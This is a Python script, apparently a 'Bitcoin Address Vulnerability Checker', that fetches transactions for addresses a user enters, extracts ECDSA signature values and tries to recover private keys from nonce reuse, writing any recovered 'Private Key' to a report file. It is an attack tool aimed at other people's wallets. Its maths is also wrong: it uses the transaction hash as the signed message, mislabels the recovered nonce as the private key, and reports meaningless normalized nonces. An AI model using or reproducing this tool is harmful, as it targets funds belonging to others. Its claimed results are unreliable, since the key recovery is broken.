import requests
from sympy import mod_inverse
import matplotlib.pyplot as plt
import math

def fetch_transactions(address):
    api_url = f"https://blockchain.info/rawaddr/{address}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            data = response.json()
            return data.get("txs", [])
        else:
            print(f"Error: Unable to fetch transactions for {address}.")
            return []
    except Exception as e:
        print(f"Error: {e}")
        return []

def extract_signatures(transactions):
    signatures = []
    for tx in transactions:
        if "inputs" in tx:
            for inp in tx["inputs"]:
                if "script" in inp:
                    script = inp["script"]
                    if len(script) > 130:
                        r, s = script[:64], script[64:128]
                        z = tx["hash"][:64]
                        try:
                            signatures.append((int(r, 16), int(s, 16), int(z, 16)))
                        except ValueError:
                            continue
    return signatures

def calculate_private_key(r1, s1, z1, r2, s2, z2, n):
    if r1 != r2:
        return None
    numerator = (z1 - z2) % n
    denominator = (s1 - s2) % n
    try:
        denominator_inv = mod_inverse(denominator, n)
        private_key = (numerator * denominator_inv) % n
        return private_key
    except:
        return None

def check_nonce_bias(signatures, address):
    k_values = []
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

    for r, s, z in signatures:
        try:
            k = (z * mod_inverse(s, n)) % n
            if k:
                k_values.append(k)
        except Exception as e:
            continue

    if len(k_values) < 2:
        print("Not enough signatures to analyze Nonce Bias.")
        return

    k_values = [k for k in k_values if isinstance(k, (int, float)) and math.isfinite(k)]

    if len(k_values) < 2:
        print("Not enough valid k values to analyze Nonce Bias.")
        return

    k_values_normalized = [math.log(k) if k > 0 else 0 for k in k_values]

    print("k_values (normalized):", k_values_normalized)

    with open(f"vulnerability_report_{address}.txt", "w") as file:
        file.write(f"Vulnerability Report for Bitcoin Address: {address}\n")
        file.write("=" * 50 + "\n")
        file.write(f"Number of Signatures Analyzed: {len(signatures)}\n")
        file.write(f"Number of Valid k Values: {len(k_values)}\n")
        file.write(f"Min Nonce (k): {hex(int(min(k_values_normalized)))}\n")
        file.write(f"Max Nonce (k): {hex(int(max(k_values_normalized)))}\n")

        private_keys = []
        for i in range(len(signatures) - 1):
            for j in range(i + 1, len(signatures)):
                r1, s1, z1 = signatures[i]
                r2, s2, z2 = signatures[j]
                if r1 == r2:
                    print(f"\nPotential nonce reuse detected between signatures {i} and {j}.")
                    print(f"r1: {hex(r1)}, s1: {hex(s1)}, z1: {hex(z1)}")
                    print(f"r2: {hex(r2)}, s2: {hex(s2)}, z2: {hex(z2)}")
                    private_key = calculate_private_key(r1, s1, z1, r2, s2, z2, n)
                    if private_key:
                        print(f"Private Key Calculated: {hex(private_key)}")
                        private_keys.append(private_key)
                        file.write(f"\n⚠️ Warning: Nonce reuse detected between signatures {i} and {j}!\n")
                        file.write(f"Private Key: {hex(private_key)}\n")

        if not private_keys:
            print("\nNo nonce reuse detected. Private key cannot be calculated.")
            file.write("\nNo nonce reuse detected. Private key cannot be calculated.\n")
        else:
            file.write("\nAll Calculated Private Keys:\n")
            for idx, key in enumerate(private_keys):
                file.write(f"Private Key {idx + 1}: {hex(key)}\n")

        file.write("\nRaw k Values (Normalized):\n")
        file.write(str(k_values_normalized))

    if len(k_values_normalized) > 0:
        try:
            plt.hist(k_values_normalized, bins=20, alpha=0.75, color="blue", edgecolor="black")
            plt.xlabel("Nonce (k) Value Range (Normalized)")
            plt.ylabel("Frequency")
            plt.title("Distribution of Nonce (k) Values")
            plt.savefig(f"nonce_distribution_{address}.png")
            plt.show()
        except Exception as e:
            print(f"Error during plotting: {e}")
            return
    else:
        print("No valid k values found to analyze Nonce Bias.")

def analyze_address(address):
    print(f"\nFetching transactions for {address}...")
    transactions = fetch_transactions(address)
    if not transactions:
        print(f"No transactions found for {address}.")
        return

    print("Extracting ECDSA signatures...")
    signatures = extract_signatures(transactions)

    if not signatures:
        print("No valid signatures found.")
        return

    print("Analyzing Nonce Bias...")
    check_nonce_bias(signatures, address)

def main():
    print("Welcome to the CRYPTOGRAPHYTUBE Bitcoin Address Vulnerability Checker")

    addresses_input = input("Enter Bitcoin Addresses (separated by commas): ").strip()
    
    addresses = [address.strip() for address in addresses_input.split(",")]
    
    for address in addresses:
        print(f"\nChecking address: {address}")
        analyze_address(address)

if __name__ == "__main__":
    main()
